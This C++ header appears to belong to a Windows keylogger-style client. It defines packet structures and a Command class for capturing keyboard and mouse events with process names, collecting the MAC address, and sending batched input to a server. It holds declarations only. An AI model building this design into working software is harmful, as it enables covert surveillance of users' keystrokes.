#ifndef COMMAND_H_
# define COMMAND_H_

#include <map>
#include <vector>
#include <string>
#include <list>
#include <sstream>
#include <winsock2.h>
#include <IPHlpApi.h>
#include "Input.h"
#pragma comment(lib, "IPHLPAPI.lib")
#define MAX_INPUT_SEND 50

typedef struct
{
	uint8_t	lenght;
	uint8_t data[255];
}		string;

typedef struct
{
	uint8_t	size;
	string	data[255];
}		arrayString;

typedef struct
{
	int64_t		second;
	int64_t		nano;
	string		event;
	string		name;
	string		process;
}				keyboardPacket;

typedef struct
{
	int64_t		second;
	int64_t		nano;
	uint32_t	pos_x;
	uint32_t	pos_y;
	uint64_t	amount;
	string		event;
	string		name;
	string		process;
}				mousePacket;

typedef struct
{
	uint8_t	size;
	keyboardPacket data[MAX_INPUT_SEND];
}				arrayKeyboard;

typedef struct
{
	uint8_t	size;
	mousePacket data[255];
}				arrayMouse;

typedef struct
{
	uint8_t		opcode;
	uint8_t		id;
	uint16_t	size;
}				packetHeader;

typedef struct
{
	uint8_t		error;
	uint8_t		id;
}				errorResultPacket;

typedef struct
{
	uint8_t		mac[6];
}				macPacket;

typedef struct
{
	uint8_t		version;
}				versionPacket;

typedef	struct
{
	uint8_t		command;
}				commandPacket;

typedef struct
{
	arrayString	msg;
}				msgPacket;


class Command
{
private:

	std::map<std::string, char *(Command::*)(int, char *, unsigned int)> generateData;
	std::map<int, char *> _ids;
	std::map<int, char *> _ids_connect;

	char * getErrorRetur(int error, int idp, int id);

	/* functions for generateCmd */
	char * mac(int, char *, unsigned int);
	char * version(int, char *, unsigned int);
	char * connect(int, char *, unsigned int);
	char * disconnect(int, char *, unsigned int);
	char * log(int, char *, unsigned int);
	char * keyboard(int, char *, unsigned int);
	char * mouse(int, char *, unsigned int);
	char * ping(int, char *, unsigned int);
	char * pong(int, char *, unsigned int);

	// Attribute to store input keyboard 
	char		*	mouseInput;
	char		*	keyboardInput;
	unsigned int	rest;

	/* functions to generate input */
	static char * getInputPacket(const Input &);
	static char * getMousePacket(const Input &);
	static char * getKeyboardPacket(const Input &);

	char * getArrayKeyboardPacket(std::list<Input *> &);
	char * getArrayMousePacket(std::list<Input *> &);

	// Manage id packet
	bool   addPacket(int id, char * t, bool op = true);
	unsigned int getAvailableId();

	// get address mac
	uint8_t * getMacInfo(void);

public:
	Command();
	~Command();

	// built packet
	char * getCmd(const std::string &, char *, unsigned int);

	// interpret cmd
	unsigned int interpretAction(char * cmd);

	// serialize/deserialize
	static char * getStringPacket(const std::string &);
	static std::string getString(string &);
	static unsigned int getTotalSize(char *);
	static unsigned int getIdPacket(char *);
	static unsigned int getOpcode(char *);

	static int getIdResponse(char *);

	bool getArrayInput(std::list<Input *> &);
	char * getMouseInput();
	char * getKeyboardInput();

	char * fusionPacket(char *, char *);

	// get number of input not sended
	unsigned int getRestList();

	//get previous packet
	char * getPreviousPacket(unsigned int _id, bool op = true);

};

#endif /* COMMAND_H_ */